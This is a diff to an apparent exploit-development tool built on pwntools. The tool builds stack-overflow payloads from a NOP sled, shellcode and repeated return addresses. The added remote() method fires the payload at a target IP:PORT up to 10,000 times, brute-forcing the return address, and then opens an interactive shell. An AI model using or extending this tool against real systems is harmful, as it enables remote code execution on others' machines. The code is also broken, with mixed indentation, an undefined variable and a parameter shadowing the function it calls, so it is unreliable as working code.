@@ -45,24 +45,40 @@ class GenerateShellcode:
             context.endian = self.endianness
         else:
             raise SXDK("Input into endianness is wrong.")
-
-    def write_file(self, name):
         if "little" in self.endianness:
-            endian_flag = "<L"
+            self.endian_flag = "<L"
         else:
-            endian_flag = ">L"
+            self.endian_flag = ">L"
 
-        b = self.total_size - (4*self.num_of_addresses)
-        e = open(shells[self.instruction_set.lower()], "r")
+        temp_size = self.total_size - (4*self.num_of_addresses)
+        shellcode_file = open(shells[self.instruction_set.lower()], "r")
+        self.shell_data = shellcode_file.read()
+        self.shellcode_size= os.path.getsize(shells[self.instruction_set.lower()])
+        temp_size = temp_size - self.shellcode_size
+        self.total_nop = temp_size
+    def write_file(self, name):
         f = open(name, "w")
-        shell_data = e.read()
-        c= os.path.getsize(shells[self.instruction_set.lower()])
-        b = b - c
-        total_nop = b
-
-        f.write("{0}{1}{2}".format(asm('nop')*(total_nop//len(asm('nop'))), shell_data, struct.pack(endian_flag,self.starting_address)*self.num_of_addresses))
+        f.write("{0}{1}{2}\x0A".format(asm('nop')*(self.total_nop//len(asm('nop'))), self.shell_data, struct.pack(self.endian_flag,self.starting_address)*self.num_of_addresses))
 
         #f.close()
+    def remote(self, remote):
+
+        ip_addr, port = remote.split(':')
+        for i in xrange(0,10000):
+            s = remote(ip_addr, int(port))
+            s.send("{0}{1}{2}\x0A".format(asm('nop')*(self.total_nop//len(asm('nop'))), self.shell_data, struct.pack(self.endian_flag,hex( int(self.starting_address, 16) - i*self.total_nop )[2:])*self.num_of_addresses))
+	        try:
+		        connection_output =  s.recv(1024)
+		        print connection_output
+	        except:
+		        pass
+            if asdf:
+                try:
+		            s.interactive()
+                except:
+                    pass
+	        s.close()
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Shell Exploitation Development Kit")
@@ -73,7 +89,9 @@ if __name__ == "__main__":
     parser.add_argument("-s", "--starting_address", type=str, help="The starting address for your system based upon your stack.")
     parser.add_argument("-e", "--endianness", type=str, default="little", help="The endianness of your program. EX. little, big")
     parser.add_argument("-d", "--offset", type=int, default=0, help="The offset relative to the address. Utilized for guessing multiple spaces.") #Future release to have automated guesses.
-    parser.add_argument("-n", "--name_of_file", type=str, default="egg.out")
+    parser.add_argument("-n", "--name_of_file", type=str, default="egg.out", help="Name of the output file.")
+    parser.add_argument("-r", "--remote", type=str, help="Connects and sends data to a remote endpoint. Format: IPADDR:PORT")
+    parser.add_argument("-b", "--binary", type=str, help="path to the binary that is to be exploited.")
     args = parser.parse_args()
     if not args.starting_address and not args.num_of_addresses and not args.total_size:
         parser.print_help()
